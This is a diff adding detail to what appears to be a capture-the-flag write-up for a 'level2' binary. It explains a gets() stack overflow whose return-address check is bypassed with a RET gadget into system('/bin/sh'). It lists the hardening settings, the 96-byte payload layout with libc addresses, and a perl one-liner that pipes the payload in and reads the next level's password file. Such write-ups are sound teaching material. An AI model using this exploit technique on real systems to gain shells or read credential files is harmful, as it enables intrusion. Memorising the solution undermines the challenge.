@@ -1,16 +1,30 @@
 ## Level2 - Buffer Overflow with RET Gadget Chain Exploit
 Buffer overflow via gets(). Return address check blocks 0xb0xxxxxx range (libc). Bypass with RET gadget at 0x0804853e.
+
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
+
 ### Vulnerability
 - Function p() allocates 104 bytes, buffer at EBP-0x4c (76 bytes)
 - gets() reads input without bounds checking
 - Validates return address: if ((addr & 0xb0000000) == 0xb0000000) print "Nope"
 - Only first return is checked, subsequent jumps not validated
+
 ### RET Gadget Trick
 Jump to RET instruction at 0x0804853e:
 1. Address 0x0804853e passes check: (0x0804853e & 0xb0000000) = 0
 2. RET pops next stack value (system() address) into EIP
 3. Second jump to system() bypasses check
 4. system("/bin/sh") spawns shell with level3 privileges
+
 ### Payload (96 bytes)
 ```
 [80 bytes: "A" * 80]           (CRITICAL: 80 not 76!)
@@ -19,10 +33,12 @@ Jump to RET instruction at 0x0804853e:
 [4 bytes: 0xb7e5ebe0]          exit()
 [4 bytes: 0xb7f8cc58]          "/bin/sh"
 ```
+
 ### Execution
 ```bash
 (perl -e 'print "A" x 80 . "\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7\n"'; echo "cat /home/user/level3/.pass") | ./level2
 ```
+
 ### Critical Details
 - **80 bytes** (not 76!) - 4 bytes padding between buffer and return address
 - **Newline after payload** - gets() reads until \n
